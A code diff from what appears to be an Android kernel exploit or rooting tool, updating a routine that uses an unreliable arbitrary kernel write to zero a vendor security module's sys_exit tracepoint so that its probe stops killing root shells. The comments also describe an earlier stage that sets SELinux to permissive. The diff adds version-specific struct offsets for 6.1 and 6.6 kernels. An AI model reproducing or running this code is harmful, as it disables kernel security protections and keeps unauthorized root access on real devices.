@@ -921,10 +921,14 @@ static pid_t spawn_child(struct child_pipes *p) {
  * the tagged process on the next sys_exit. This makes ksud and all shells
  * it spawns die immediately after getting root.
  *
- * Fix: zero __tracepoint_sys_exit.funcs (at tp+TRACEPOINT_FUNCS_OFF=0x40).
- * The standard kernel tracepoint iterator checks for NULL funcs before
- * calling probes — safe to zero, no kernel panic. The commit_creds probe
- * (func2) still runs and sets tags, but func1 never fires to act on them.
+ * Fix: zero __tracepoint_sys_exit.funcs (at tp + tracepoint_funcs_off()).
+ * The kernel's tracepoint iterator NULL-checks funcs before walking the
+ * probe array, so zeroing it is safe — no panic, no probes called. The
+ * commit_creds probe (func2) still runs and sets tags, but func1 never
+ * fires to act on them.
+ *
+ * NOTE: funcs is NOT at a fixed offset across KMIs — see target.h. On 6.6
+ * the struct gained `probestub` and funcs moved 0x40 -> 0x48.
  *
  * Gated on:
  *   - vr.ko detected in /proc/modules (vr_loaded)
@@ -933,15 +937,42 @@ static pid_t spawn_child(struct child_pipes *p) {
  * Called once after W1 (SELinux permissive), before spawn_victim.
  * 5 retries because do_one_write is probabilistic.
  */
+
+/* offsetof(struct tracepoint, funcs) for the running KMI. */
+static uint32_t tracepoint_funcs_off(void) {
+  const char *r = active_offsets ? active_offsets->uname_r : NULL;
+  unsigned maj = 0, min = 0;
+  if (!r || sscanf(r, "%u.%u", &maj, &min) != 2) {
+    pr_warning("vr global: cannot parse KMI '%s'; assuming 6.1 layout\n",
+               r ? r : "(null)");
+    return TRACEPOINT_FUNCS_OFF_6_1;
+  }
+  /* Boundary verified on 6.1 (0x48/0x40) and 6.6 (0x50/0x48) only; other
+   * KMIs are assumed to follow the same rule. Re-check with
+   * `__traceiter_sys_exit` if a new KMI misbehaves. */
+  if (maj > 6 || (maj == 6 && min >= 6)) return TRACEPOINT_FUNCS_OFF_6_6;
+  return TRACEPOINT_FUNCS_OFF_6_1;
+}
+
 static int neutralize_vr_global(void) {
   if (!active_offsets || !active_offsets->off_vr_sys_exit_tp) {
-    pr_info("vr global: off_vr_sys_exit_tp not set; skipping\n");
+    /* The caller only gets here when vr.ko is actually loaded, so this is
+     * a real gap, not a non-vivo device: say so loudly instead of the old
+     * silent skip, which hid the whole failure on 6.6. */
+    pr_warning("vr global: vr.ko is loaded but off_vr_sys_exit_tp is unset "
+               "(kernel %s not in the offset table and no offsets.json "
+               "override); KSU shells will be killed\n",
+               active_offsets ? active_offsets->uname_r : "(no offsets)");
     return 0;
   }
+  uint32_t funcs_off = tracepoint_funcs_off();
   uintptr_t tp_funcs_addr =
       data_addr(KIMAGE_TEXT_BASE + active_offsets->off_vr_sys_exit_tp)
-      + TRACEPOINT_FUNCS_OFF;
-  pr_info("vr global: zeroing sys_exit tp->funcs @ %016zx\n", tp_funcs_addr);
+      + funcs_off;
+  pr_info("vr global: tp=%016zx funcs_off=0x%x -> zeroing @ %016zx\n",
+          (size_t)data_addr(KIMAGE_TEXT_BASE +
+                            active_offsets->off_vr_sys_exit_tp),
+          funcs_off, tp_funcs_addr);
   for (int attempt = 1; attempt <= 5; attempt++) {
     int ok = do_one_write(tp_funcs_addr,
                           "VR-global: sys_exit tp->funcs", 1, 1);
